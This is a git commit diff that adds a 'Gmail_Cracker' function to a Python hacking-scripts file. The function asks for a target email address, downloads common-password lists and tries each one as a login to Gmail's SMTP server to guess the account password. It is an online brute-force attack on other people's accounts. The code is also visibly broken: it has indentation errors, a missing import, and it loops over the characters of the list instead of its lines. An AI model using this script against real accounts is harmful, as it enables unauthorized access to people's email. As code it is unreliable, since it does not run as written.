55c92897bc1255394095656aa40fa0d9def4158e
MIGIC <holocron.ltd@gmail.com>
2022-07-29 03:11:31 +0100

    Updated Password_tools & Added odyssey.ASCII.txt

--- Power_User/Hacking_Scripts/Password_tools.py
+++ Power_User/Hacking_Scripts/Password_tools.py
@@ -1,8 +1,11 @@
-import hashlib
 import os
-import urllib.request
+import smtplib
 import hashlib
+import urllib.request
 from colorama import Fore
+
+
+# UNTESTED
 
 def HASHER():
 
@@ -115,6 +118,73 @@ def SHA1_Cracker():
     print("Password Not Found in Password List")
 
 
+def Gmail_Cracker():
+    Gmail_Cracker_Logo = """
+   _____ __  __          _____ _         _____ _____            _____ _  ________ _____  
+  / ____|  \/  |   /\   |_   _| |       / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
+ | |  __| \  / |  /  \    | | | |      | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
+ | | |_ | |\/| | / /\ \   | | | |      | |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
+ | |__| | |  | |/ ____ \ _| |_| |____  | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
+  \_____|_|  |_/_/    \_\_____|______|  \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ 
+__________________________________________________________________________________________
+    """
+    print(Gmail_Cracker_Logo)
+
+    smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpServer.ehlo()
+    smtpServer.starttls()
+
+        Pass_list_Options = """
+    [!] Note: The longer the password list
+    the longer the duration, however
+    better the odds.
+    ----------------------------------
+    [1]-- Top 100  Most Used Passwords
+    [2]-- Top 1K   Most Used Passwords
+    [3]-- Top 10K  Most Used Passwords
+    [4]-- Top 100K Most Used Passwords
+    [5]-- Top 1Mil Most Used Passwords
+    """
+    user = input("Enter Target Email Address: ")
+    print(Pass_list_Options)
+    Decision = input("Pick a Password List: ")
+    
+    if Decision == "1":
+    #Top 100
+    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt').read(), 'UTF-8')
+    
+    elif Decision == "2":
+    #Top 1k
+    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt').read(), 'UTF-8')
+    
+    elif Decision == "3":
+    #Top 10K
+    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'UTF-8')
+
+    elif Decision == "4":
+    #Top 100K
+    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt').read(), 'UTF-8')
+
+    elif Decision == "5":
+    #Top 1Mil
+    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt').read(), 'UTF-8')
+
+    else:
+        print("Defaulting to the Top 1K password list")
+        time.sleep(2.5)
+        #Top 1k
+        passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt').read(), 'UTF-8')
+
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+    for password in passList:
+        password = password.strip('\n')
+        try:
+            smtpServer.login(user, password)
+            print('[+] Password Found: %s' % password) 
+        except smtplib.SMTPAuthenticationError:
+            print('[-] Wrong Password: %s' % password)
 
 
 
